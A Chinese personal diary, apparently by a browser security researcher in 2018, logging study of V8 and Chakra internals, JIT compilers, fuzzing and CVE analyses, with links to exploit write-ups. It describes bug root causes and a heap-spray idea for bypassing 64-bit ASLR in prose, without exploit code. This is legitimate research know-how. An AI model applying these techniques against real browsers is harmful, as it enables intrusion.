src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" title="2018-5-3"></a>2018-5-3</h2><ol><li>下午在看书，然后突然接了玄武的面试，患得患失吧，之前面试都没这种感觉。</li><li>总结一下面试：<br>CTF和内核这种充数的不算，好歹面的是浏览器组。<br>主要是讲了v8的一个洞，然后oob有一个点没分析清楚，我需要透彻的再搞一下了，还是太菜。<br>感谢给我讲了这个点的sky师傅，面的时候被问到这里真心紧张了。<br>面了45分钟，口干舌燥，最后我提问的时候，问了自己读浏览器源码的方法是否合适，万分期望能过。<br>也问了我对各种缓解机制的了解，然后就是漏洞利用，我讲的每一个洞，都被问了怎么利用，这个答的太差了，真的只是说说思路了，自己搞，写exp，真的没试过……该提升这方面的技能了，不能停滞不前！</li><li>CTF暂时不玩了，在拿到offer之前。</li></ol><h2 id="2018-5-4"><a href="#2018-5-4" class="headerlink" title="2018-5-4"></a>2018-5-4</h2><ol><li>webkit技术内幕里关于v8有一些描述，有一些帮助。</li><li>理解了一下原型链是什么。</li></ol><h2 id="2018-5-5-9"><a href="#2018-5-5-9" class="headerlink" title="2018-5-5-9"></a>2018-5-5-9</h2><ol><li>有点忘了自己都做了什么？最近做的东西周期越来越长，分开来看每天都没什么好记的（都是借口……最近太兴奋和激动有点摸鱼）</li><li>玄武实验室的offer拿到了~我最初想要的都有了，以后只需要往着安全研究员和优秀黑客的方向继续努力就行。</li><li>最近有在翻v8的一些日语资料，翻完了会放出来吧，一边看资料一边查资料读slide打基础，还有鲸书准备读。</li></ol><h2 id="2018-5-10"><a href="#2018-5-10" class="headerlink" title="2018-5-10"></a>2018-5-10</h2><ol><li>继续翻v8 exploit的资料，大概翻完了1/3，看到了GC机制那里。</li><li>下午上机组实验太伤脑子了……茶，然后最近准备再调一个v8的oob写wp了，不过还得等等…一样一样来。</li><li>c++有点不熟了呀，还是要再搞搞……</li></ol><h2 id="2018-5-11"><a href="#2018-5-11" class="headerlink" title="2018-5-11"></a>2018-5-11</h2><ol><li>继续翻v8资料，理解引擎很重要，在此基础上调洞比起靠感觉还是要好点的，纯靠感觉容易偏。</li><li>翻完了gc，好像稍微懂一点了。</li><li>今天其实发生了很多事情吧，不过不方便写在日记里，就这样吧。</li></ol><h2 id="2018-5-12"><a href="#2018-5-12" class="headerlink" title="2018-5-12"></a>2018-5-12</h2><ol><li>继续翻v8，总算翻到了对象存储（其实这部分该最先讲吧……）</li><li>准备信息系统开发的答辩什么的，下周开始要准备复习功课了。</li></ol><h2 id="2018-5-13-14"><a href="#2018-5-13-14" class="headerlink" title="2018-5-13-14"></a>2018-5-13-14</h2><ol><li>今天把v8的ppt的引擎基础部分翻完了，入职的事情也都搞的差不多了，剩下就是在去之前好好努力了。</li><li>感觉路由器这种硬件可以玩玩……相对好挖洞呢。。</li></ol><h2 id="2018-5-15-6-9"><a href="#2018-5-15-6-9" class="headerlink" title="2018-5-15-6-9"></a>2018-5-15-6-9</h2><p>这段时间沉迷期末考试无法自拔？？？嘤嘤嘤<br>有个小插曲，因为弄错了考试时间导致挂科，吃一堑长一智。。。<br>好了，开始记笔记了。</p><h2 id="2018-6-10-11"><a href="#2018-6-10-11" class="headerlink" title="2018-6-10-11"></a>2018-6-10-11</h2><p>把v8 exploit的PPT翻译收了个尾，重新整理了下v8的学习思路。<br>从漏洞函数回溯调用路径，断点调试等，还有exp的常用思路。</p><h2 id="2018-6-12-14"><a href="#2018-6-12-14" class="headerlink" title="2018-6-12-14"></a>2018-6-12-14</h2><p>最近脚上起了个小疮去了两趟医院，走路还好疼，真的是非常不顺利了。</p><h2 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018-6-15"></a>2018-6-15</h2><p>在mac上编译了v8，之前是在win上编译的，不得不说……有个坑点就是在16.04上面，不checkout到旧的分支，是无法编译成功的，耽误了一天。<br>然后认真的研究了一下fast Properties和hidden class，拿gdb打debugprint看了很多东西学习，记笔记记笔记。</p><h2 id="2018-6-16"><a href="#2018-6-16" class="headerlink" title="2018-6-16"></a>2018-6-16</h2><p>翻译了Source to Binary Jounrney of V8 javascript engine<br>categories，get了新知识，v8的体系结构还要多调试理解。<br>另外，再需要啃一本鲸书，理解一下编译优化技术。</p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018-6-17"></a>2018-6-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-180229.png" alt="">积累着读了一点PPT<br>突然发现也已经看了和写了，还调试了不少东西了，慢慢的对v8从生疏到开始渐渐熟悉，不过到挖掘漏洞的方法论可能还要再过一段时间吧。<br>毕竟v8代码我都没咋读过，翻翻pipeline.cc了解下Turbofan的一些API</p><h2 id="2018-6-18"><a href="#2018-6-18" class="headerlink" title="2018-6-18"></a>2018-6-18</h2><p>学习了阅读v8的bytecode，和了解bytecode的生成和解释执行还有to graph的过程</p><h2 id="2018-6-19"><a href="#2018-6-19" class="headerlink" title="2018-6-19"></a>2018-6-19</h2><p>今天开始要复习一点算法呢。<br>学习了v8增加的gdb命令使用,读了<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a><br>真的难懂，看了一下午，没什么头绪。。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-19-115842.jpg" alt=""><br>关于代码生成，Builtins和Runtime还是云里雾里，头疼。<br>写了个小工具来转换unsigned long long和double<br>v8的对象存储又看了一遍。。。结果今天还是没复习算法。。睡觉睡觉。</p><h2 id="2018-6-20-21"><a href="#2018-6-20-21" class="headerlink" title="2018-6-20-21"></a>2018-6-20-21</h2><p>搬家，寄了一些东西回家，整理了整理书，虽然我看的都是电子书，但是还是存了这么多呀。<br>三年不长，但也不短。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-21-173058.jpg" alt=""><br>晚上收拾了我最后一点东西，把入职需要的材料办完，要走了呢。</p><h2 id="2018-6-22-23"><a href="#2018-6-22-23" class="headerlink" title="2018-6-22-23"></a>2018-6-22-23</h2><p>复习了几道动态规划的算法题，要考试啦。<br>另外最好的消息是迟到了。。只做了十分钟的计算机组成原理居然及格了。。感谢老师，师生情太深了，感动感动。<br>这段时间发生了不少事情，然后让我又想明白了一些事情，这段时间确实，没怎么学的进去，学的并不好。<br>今天看了蛮久的漏洞，不知道其他人是什么样，但是在我最烦最难受的时候，安全研究是最能让我平静下来的一件事情。<br>我喜欢这样，虽然目前很多地方做的并不好，但是可以慢慢学习~<br>写了个case CVE-2016-1646，还有另外一个JIT的洞，有点难懂。</p><h2 id="2018-6-24-25"><a href="#2018-6-24-25" class="headerlink" title="2018-6-24-25"></a>2018-6-24-25</h2><p>调v8一个麻烦就是编译，得想个办法.<br><a href="http://eternalsakura13.com/2018/06/26/v8_environment/">http://eternalsakura13.com/2018/06/26/v8_environment/</a><br>总算是搞定了，最近一些技术文章读的少了，思路不够开阔，学习学习……<br>还有算法考试要到了。。趴桌，继续在看动态规划和贪婪</p><h2 id="2018-6-26"><a href="#2018-6-26" class="headerlink" title="2018-6-26"></a>2018-6-26</h2><p>学习了CVE-2016-5198，原理就是在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><p>都还需要总结（</p><h2 id="2018-6-27-28"><a href="#2018-6-27-28" class="headerlink" title="2018-6-27-28"></a>2018-6-27-28</h2><ol><li>看了一些内核的资料，整理整理，顺便给人鸡汤了一下。。</li><li>刷算法，准备期末。。凉了啊。。</li></ol><h2 id="2018-6-29"><a href="#2018-6-29" class="headerlink" title="2018-6-29"></a>2018-6-29</h2><ol><li>累的要死的一天,飞机晚点了三个小时，卒……</li><li>看了一些资料，学会了如何成为一个合格的安全研究员（打了鸡血</li><li>在mathias这里住下了~New story要开始了</li></ol><h2 id="2018-6-30-7-2"><a href="#2018-6-30-7-2" class="headerlink" title="2018-6-30-7-2"></a>2018-6-30-7-2</h2><ol><li>这两天在忙着入职，装电脑和认识同事。</li><li>和导师说了自己最近在做什么，从tools和Bug study的角度，然后他让我继续搞v8，得偿所愿，不过估计要干活要明天了，说是要分析的洞还没给我。</li><li>[ Browser ]  Microsoft Edge Chakra 引擎 UAF 漏洞分析 (CVE-2018-0946)：<a href="https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3</a></li><li>[ Browser ] CVE-2018-5146<br><a href="http://blogs.360.cn/blog/how-to-kill-a-firefox/" target="_blank" rel="noopener">http://blogs.360.cn/blog/how-to-kill-a-firefox/</a><br>A神之前就说在写一个没有poc的exp，不知道是不是这个洞，突然想到。<br>others（同事写的root cause和exploit，还有怎么用shadow来分析堆，很有意义。</li><li>看了鲸书1-4章，不少熟悉的名词……interesting</li></ol><h2 id="2018-7-3"><a href="#2018-7-3" class="headerlink" title="2018-7-3"></a>2018-7-3</h2><p>刚入职这段时间确实是最宽松的一段时间了，只需要学习就行了，没有什么其他KPI，后面应该就多了。<br>今天分析CVE-2017-0234，不过主要花时间都花在环境搭建上，漏洞触发和分析并不难，或者说还好。</p><h2 id="2018-7-4"><a href="#2018-7-4" class="headerlink" title="2018-7-4"></a>2018-7-4</h2><ol><li>今天把CVE-2017-0234的分析报告初版写完了，掌握了vs和windbg的两种很棒的调试方法，然后在编译v8，算是学到了一点东西，得再加强code review的能力。</li><li>成功在win上编译好了v8，可以玩一下。</li></ol><h2 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018-7-5"></a>2018-7-5</h2><ol><li>0234还要分析第二版，不过还不急，今天在自己分析其他v8的漏洞，一个p2o的洞的利用，思路真是棒，学到了学到了~<br><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></li></ol><h2 id="2018-7-6"><a href="#2018-7-6" class="headerlink" title="2018-7-6"></a>2018-7-6</h2><ol><li>上班摸鱼好几天，今天下午听了各个大佬每周做的事情和科总的分享，觉得要走的路还很长。</li><li>目前的计划：<br>先看一些代码和语言标准；<br>talk和blog（可以看看如何移植v8，并思考其中可能出现的漏洞<br>Firefox的<a href="https://github.com/MozillaSecurity/funfuzz/tree/master/src/funfuzz/js/jsfunfuzz" target="_blank" rel="noopener">fuzz</a>（编译原理不止要领会意义，更要能写出来。<br>另外是关于win下用到了v8的各种软件的调试，也是一个学习面（比如可以看看漏洞战争等资料学习windbg和常规利用）</li></ol><p><strong>你要用较少的时间走完别人走了很久的路，所以你要跑起来，要飞快地跑起来。</strong></p><ol start="3"><li>和导师聊过自己分析的第一版漏洞，发现很多问题，我需要更深入的思考。其实安全研究有点像一个侦探游戏，每一行都是线索，我漏掉一点东西就拼不出完整的拼图。（因缺思厅<br>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?<br>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）<br>（去掉边界的代码是三行，代表一个JIT生成的可选项，为什么要这么选？）</li></ul><h2 id="2018-7-7"><a href="#2018-7-7" class="headerlink" title="2018-7-7"></a>2018-7-7</h2><ol><li>今天上午去办了个房卡，一个月4000，押二付一，资产清零2333，其实居住条件就一般啦，只是离公司近，方便加班（摸鱼）</li><li>今天和朋友聚了个餐，以后就全吃公司救济粮了~</li><li>继续看0234，直接挂win API没调到点子上，但是最后还是换了个想法搜到了。。还行。。方向没错。</li><li>思考和调试新的攻击方法，趴桌。</li></ol><h2 id="2018-7-8"><a href="#2018-7-8" class="headerlink" title="2018-7-8"></a>2018-7-8</h2><ol><li>把0234第二版写好了（调试分析昨天已经结束了，今天只是整理文案……）</li><li>然后看c++对象模型，很有意思。</li><li>研究了一下js fuzzer</li><li>继续思考和调试某个洞（或者说软件）的新的攻击方法。</li></ol><h2 id="2018-7-9"><a href="#2018-7-9" class="headerlink" title="2018-7-9"></a>2018-7-9</h2><ol><li>下午就是在部署fuzz和抄代码,然后xx发了个webkit的洞，我看看……还有公司推送了一个dlmalloc的。。都看看</li><li>导师说我写的FUZZ是浪费时间2333，嗯，是这样的，我不用太心急，这就是有人带的好处……很多点能够及时纠正（然后一下午没了2333<br>沿着各个组件，各个组件都出过什么漏洞这个线索去分析好了，人的力量才是无穷大的。<br>嗯，先把思路和相关知识建立起来。</li></ol><h2 id="2018-7-10-11"><a href="#2018-7-10-11" class="headerlink" title="2018-7-10-11"></a>2018-7-10-11</h2><ol><li>在这找test看，<a href="https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/</a></li><li>v8相关的索引，<a href="https://v8.paulfryzel.com/docs/master/index.html" target="_blank" rel="noopener">https://v8.paulfryzel.com/docs/master/index.html</a></li><li>看每天的commit，<a href="https://github.com/v8/v8/commits/master" target="_blank" rel="noopener">https://github.com/v8/v8/commits/master</a></li><li>看gpz的漏洞，每天写一篇分析（当然不可能放出来（逃<br><a href="https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725" target="_blank" rel="noopener">https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725</a></li><li>最近在思考一些个人研究是否要放博客上，仔细想了想还是算了，漏洞理解的思路，比很多东西要宝贵吧。</li></ol><h2 id="2018-7-12"><a href="#2018-7-12" class="headerlink" title="2018-7-12"></a>2018-7-12</h2><ol><li>现在想要挖到洞，想学会漏洞利用，顺便，月乃安利了一个repo,PPP的<a href="https://github.com/theori-io/pwnjs" target="_blank" rel="noopener">https://github.com/theori-io/pwnjs</a></li><li>这两天可能因为一些原因心情异常烦躁，一方面是弱的不行的自己，一方面是想要的更多，哇，真想哭……好了，杂事就不管了，我又不是神，怎么可能面面俱到。</li><li>闭关，博客会更新日记，在有一定系统化的总结思路之前，博客不会再更新文章了（日更变月更？）</li></ol><h2 id="2018-7-13"><a href="#2018-7-13" class="headerlink" title="2018-7-13"></a>2018-7-13</h2><p>今天开了个组会，可以说是非常开心了……<br>每天东看瞎看，没看点有用的东西……（发呆</p><p>然后导师给了我下一版要继续分析清楚的点。</p><ol><li>VritualAlloc分配的和GC管理的区别，GC机制</li><li>开发者为什么这么设计这个？为什么之前不限制4GB<br>（明明超过4GB就会OOB，为什么还去掉上界，他们就真的是觉得4GB足够大？其实不是；patch补的其实是没问题的，虽然依然可以dos，但是这个不是大问题，应该还是要从GC的角度去再思考一下，或者其他？）</li><li>这个内存管理是实现有问题还是设计有问题？实现有问题那么还有哪些地方是这么实现的，设计同理。要比开发者更了解他们所写的软件（：<br>安全研究的本质还是回归到对开发者的代码的深层次理解，一层一层的往下深挖，才能挖到线索，挖到真相（</li></ol><p>太菜了太菜了……受不了我自己了……<br>今天的收获是和刘炜师傅指点了我好多，一些源码里的疑问搞的清楚了，还解决了其他问题，nice……每天学的都比较痛并快乐着了。</p><h2 id="2018-7-14"><a href="#2018-7-14" class="headerlink" title="2018-7-14"></a>2018-7-14</h2><p>一觉睡到下午一点半……23333，还好周末，不过平常起得也不早，还好在玄武，要不然要被开了……<br>然后晚上和川神还有夜影他们约了个饭，感觉还不错~(然后吃完了滚回来加班)<br>今天看了点chakra，分析了cve-2016-7189，用英文写了wp，明天再整理一下pattern（root cause比较好写，只是关于callback我调了一下，挺好玩的）<br>type confused还是很普遍的漏洞，但是其实还是不大好覆盖到每个点去看，有没有什么好思路呢（发呆</p><h2 id="2018-7-15-18"><a href="#2018-7-15-18" class="headerlink" title="2018-7-15-18"></a>2018-7-15-18</h2><p>这几天真的有点懵……或者说有点迷茫，开始搞chakra，代码还是那么难啃，不过比v8好搞多了……<br>关于开发者的假设最后还是弄清楚了，其实就还好，是我分析的时间间隔有点长，没直接串起来，一个宽度问题。<br>在想明白之前觉得自己要被开了，现在还好。<br>今天游走了一天，把zdi的博客上的一些分析看了，有点意思，但是还不够。<br>另外我又要继续分析了。<br>为什么VirtualAlloc比GC更不安全，GC机制。<br>导师让我找几个渲染引擎的老的UAF洞看看~（估计就16年的吧<br>感觉又要踩坑……<br>搭了一个VPN服务器，这样就不用担心v8拉取不下来了……<br><a href="https://cloud.tencent.com/developer/article/1154896" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1154896</a><br>人生苦短我用docker</p><h2 id="2018-7-19-24"><a href="#2018-7-19-24" class="headerlink" title="2018-7-19-24"></a>2018-7-19-24</h2><ol><li>看了看雪峰会，sky师傅讲浏览器的议题很有意思。</li><li>看洞，整理一些loki的洞看。</li><li>准备开始JIT之旅<br>TODO List</li></ol><p>中科大的编译原理课程，比较简单<br><a href="http://mooc.study.163.com/course/1000002001?tid=1000003000#/info" target="_blank" rel="noopener">http://mooc.study.163.com/course/1000002001?tid=1000003000#/info</a><br><a href="http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/</a></p><p>斯坦福的CS143，编译基础<br><a href="https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about" target="_blank" rel="noopener">https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about</a><br>斯坦福的CS243，编译优化<br><a href="http://infolab.stanford.edu/~ullman/dragon/w06/w06.html" target="_blank" rel="noopener">http://infolab.stanford.edu/~ullman/dragon/w06/w06.html</a></p><p>CMU，编译基础<br><a href="http://www.cs.cmu.edu/~rjsimmon/15411-f15/" target="_blank" rel="noopener">http://www.cs.cmu.edu/~rjsimmon/15411-f15/</a><br>CMU，编译优化<br><a href="http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/</a></p><ol start="4"><li>pizlo的PPT很nice<br><a href="http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf</a></li><li>开始0236……</li></ol><h2 id="2018-7-25-26"><a href="#2018-7-25-26" class="headerlink" title="2018-7-25-26"></a>2018-7-25-26</h2><p>分析漏洞更深入了，思考的过程和思路慢慢搭起来了。<br>今天开始看编译原理。记录一些有趣的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">perfect hashing</span><br><span class="line">1. 什么是（关键字的）完美哈希？</span><br><span class="line">没有关键字冲突的哈希函数</span><br><span class="line">2. 如何构造完美哈希？试列举一到两种算法。</span><br><span class="line">目前用的比较多的是gperf算法</span><br><span class="line">为什么需要构造完美哈希？用关键字单链表是否f可以？</span><br><span class="line">因为完美哈希一次匹配，的时间效率为O(1),而链表要扫描一遍，时间效率为O(N)</span><br></pre></td></tr></table></figure><p>正则表达式代码生成工具<br><a href="http://www.txt2re.com/" target="_blank" rel="noopener">http://www.txt2re.com/</a><br>NFA-&gt;DFA,有限状态自动机</p><p>递归下降分析算法<br>LL(1),ANTIR</p><h2 id="2018-7-27"><a href="#2018-7-27" class="headerlink" title="2018-7-27"></a>2018-7-27</h2><p>总结一下今天，组会上分享的刚好是浏览器相关的东西，学到很多，此外最重要的是听了别人每周在干什么，也慢慢的知道了自己以后研究该看什么。<br>此外就是在看编译原理了，JIT始终是一个大的攻击面，而且写js/dom fuzz也绕不开编译原理，要吃掉这块始终不容易。。我还是太菜了。</p><h2 id="2018-7-28-29"><a href="#2018-7-28-29" class="headerlink" title="2018-7-28-29"></a>2018-7-28-29</h2><ol><li>这两天看了realworld ctf,和继续学习编译原理,看的还算快。。</li><li>spectre的漏洞利用和同事聊了一下，还是没做出来这个题，等官方wp学习一下，说来长亭这个比赛很有意思了……<br>说来vm escape已经变成常规题了……23333，可以学习一个了…<br>代码量还是不够啊，等这段时间搞完，就大量抄和读了……（没什么自己的需求，就不自己写了）<br>积累积累积累</li></ol><h2 id="2018-7-30"><a href="#2018-7-30" class="headerlink" title="2018-7-30"></a>2018-7-30</h2><p>终于看得懂《IFuzzer: An Evolutionary Interpreter Fuzzer<br>Using Genetic Programming》说的什么了。<br>不过确实有局限性，充其量是个demo，想自己写一个了。<br>commit要看，标准要读，漏洞要调，代码要写。<br>小孩子才做选择，我全都要。</p><h2 id="2018-7-31-8-2"><a href="#2018-7-31-8-2" class="headerlink" title="2018-7-31-8-2"></a>2018-7-31-8-2</h2><p>ctf pwn中的v8漏洞利用的坑差不多结了。。思路很多但是终究还是那些东西，利用都是好搞的，回归挖洞（笔记不放）</p><p>学会用antlr4（词法/语法分析）写点东西开了个头。。不过预计搞起来也很快<br>（IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming）<br>主要是参考这篇paper学习一下，有很多想法了。</p><p>然后剩下的主要工作就是学习编译优化，审计一下v8的JIT（看刘炜师傅写的两篇wp很有启发，看得出他对v8 IR有很多理解了，我也可以就这一块多做一些总结输出。。。</p><p>和朋友聊了一下，有的东西没有想象中的难，赶紧做出点东西，然后往前走吧。</p><h2 id="2018-8-3"><a href="#2018-8-3" class="headerlink" title="2018-8-3"></a>2018-8-3</h2><ol><li>日子一天天的过……今天发工资了蛮开心2333</li><li>今天分享的东西蛮有意思，听大家说这周做了什么，关于Fuzz的讨论也有意思，貌似有点上路了，这些基础的积累都是有意义的。</li><li>这周清理了一些坑，然后挖了更多坑，结了antlr4之后准备开始污点分析之旅了。<br>顺手列一下煜博推荐的paper：<br>All You Ever Wanted to Know About<br>Dynamic Taint Analysis and Forward Symbolic Execution (but might have been afraid to ask)<br>VUzzer: Application-aware Evolutionary Fuzzing<br>Towards Efficient Heap Overflow Discovery</li><li>发现一个好玩的网站的样子：<a href="http://www.vxjump.net/" target="_blank" rel="noopener">http://www.vxjump.net/</a></li><li>最后再贴一个编译优化的，还是CMU的，不过年份不同。<br><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html</a></li><li>本来最后了，不过还有新的最后，……<br>sky师傅和我讲下一步干嘛了。</li></ol><p>最后和我说了一下，其实ArrayBuffer的这种分配方式，可以完美bypass 64位ASLR<br>其实这里又涉及一个点，那就ASLR的必要条件是虚拟地址空间足够大，而我们的物理地址空间很小，不可能堆喷喷满。<br>但是……我们可以用0x10000的内存去占位4G，那么其实只要喷2G就可以了……这就bypass了，2333</p><p>这些小特性，大特性，系统特性，各种特性的深入理解和消化绝对是十分重要的。<br>我体验了一次如何从0234发现0236的过程，收获颇丰。</p><h2 id="2018-8-4-9"><a href="#2018-8-4-9" class="headerlink" title="2018-8-4-9"></a>2018-8-4-9</h2><ol><li>结束了antlr4的学习，fuzz进程挂起。</li><li>开始看v8源码，真多……真难懂2333……我好菜。</li><li>听同事说，有人看了两个月编译优化被开了。。好方。。加班看书看到2点。。<br>找到一个不错的PPT。<a href="http://sei.pku.edu.cn/~xiongyf04/SA/2015/" target="_blank" rel="noopener">http://sei.pku.edu.cn/~xiongyf04/SA/2015/</a></li><li>今天和sky师傅聊了一下，收获很多，思路很重要，不仅是挖洞的思路，调洞的思路，学习的思路，分析的思路，都很重要。</li><li>今天花时间整理了一下gpz的洞和bugs上能找到的JIT的洞，还是挺凌乱的，也开始思考一些JIT的攻击面的本质，结点的处理等等，把文件都翻了一下。</li></ol><h2 id="2018-8-9-18"><a href="#2018-8-9-18" class="headerlink" title="2018-8-9-18"></a>2018-8-9-18</h2><ol><li>好像很久没写日记了。。不知道为什么。。可能是突然泄气，人的情绪总是飘忽不定，对我们这种人更是如此。</li><li>还是写一下这段时间做了什么，还是JIT、JIT、JIT，说来我是从什么时候开始想要挖浏览器漏洞呢？为什么选择这么一条路呢？回忆一下又觉得当年浪费了太多时间在无意义的事情上（比如CTF，Android），应该好好看webkit的……叹气<br>不过说来这几天看到的JIT的资料还不错，大宝写了JIT漏洞的分析。<br><a href="http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf</a><br><a href="https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf" target="_blank" rel="noopener">https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf</a><br><a href="https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/" target="_blank" rel="noopener">https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/</a><br>从目前js引擎的攻击面来看，wasm和JIT可能是最可能出洞的点了。。也不好搞也不好搞2333<br><a href="https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html</a></li><li>周六睡到中午，然后去了长亭的“无pwn不欢”线下沙龙，领了衣服和杯子，感动。<br>冠成大佬的分享很nice，似乎一下子点出了我觉得逆向越来越迷的关键……<br><a href="https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf" target="_blank" rel="noopener">https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf</a><br>链接:<a href="https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA" target="_blank" rel="noopener">https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA</a>  密码:jgks</li><li>之前冠成大佬经常逆国产小软件挖洞，然后我一直不知道是咋搞的。。</li></ol><p><strong>现在想想，或许能够熟练的掌握trace+disassembly/指令记录+分析，这样的一种逆向能力，是十分重要的（如果是国产小软件，再加上如何从二进制文件搜索开源代码吧）</strong><br><strong>至于说，和做CTF一样，逆向各种神奇的架构和算法，我觉得是没必要的。</strong><br>嘛，虽然我还都不会，不过姑且给自己找到了一个学习的思路和方法，还是收获蛮多。<br>5. 这段时间的主要工作是在分析CVE-2017-5121，关于v8 escape analysis phase，不过没有patch，这个漏洞是发生在6.1版本之前，6.2之后换掉了整个escape analysis，重新实现了一遍。<br>这个漏洞实际上是逃逸分析将一个对象分析为不会逃逸后，将其初始化节点删除，而又有LoadElement/LoadField的节点使用它。本质上是由于有依赖关系的节点的访问顺序不正确导致的。</p><h2 id="2018-8-19"><a href="#2018-8-19" class="headerlink" title="2018-8-19"></a>2018-8-19</h2><ol><li>真的是硬生生赖床到一点半，饿的要死了才爬起来上班……</li><li>试图去搜和v8有关的design paper读，但是没找到，ORZ。。浪费时间。。</li><li>分析load elimination phase，学到不少东西。</li></ol><h2 id="2018-8-20"><a href="#2018-8-20" class="headerlink" title="2018-8-20"></a>2018-8-20</h2><p>我觉得挖edge怕不是loki的KPI吧。。又是挖了一堆，其中有一个还和大宝的撞了，是不是大佬的思路都是一样的……ORZ<br>今天可以分析学习一个。<br>今天各种填学校回去要交的材料，然后申请盖章，ORZ。<br>各种麻烦死。</p><ul><li>[Edge]  [CVE-2018-8298] [1582]   1582 - Microsoft Edge: Chakra: Bugs in InitializeNumberFormat and InitializeDateTimeFormat - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1582" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1582</a></li><li>[Edge]  [None] [1578]   1578 - Microsoft Edge: Chakra: JIT: Type confusion with InlineArrayPush - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1578" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1578</a></li><li>[Edge]  [CVE-2018-8291] [1576]   1576 - Microsoft Edge: Chakra: DictionaryPropertyDescriptor::CopyFrom doesn’t copy all fields - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1576" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1576</a></li><li>[Edge]  [CVE-2018-8279] [1570]   1570 - Microsoft Edge: Chakra: Parameter scope parsing bug - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1570" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1570</a></li><li>[Edge]  [CVE-2018-8288] [1565]   1565 - Microsoft Edge: Chakra: JIT: ImplicitCallFlags check bypass with Intl - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1565" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1565</a></li></ul><h2 id="2018-8-21"><a href="#2018-8-21" class="headerlink" title="2018-8-21"></a>2018-8-21</h2><ol><li>昨天看的一点点东西更新了一篇笔记，就当理理思路了。</li><li>昨天要的证明总算开下来了，心里松了一口气，下面调整一下自己的作息，好好工作了。</li><li>R大讲了一些turboFan IR设计的东西，给了一些paper读，非常nice<br><a 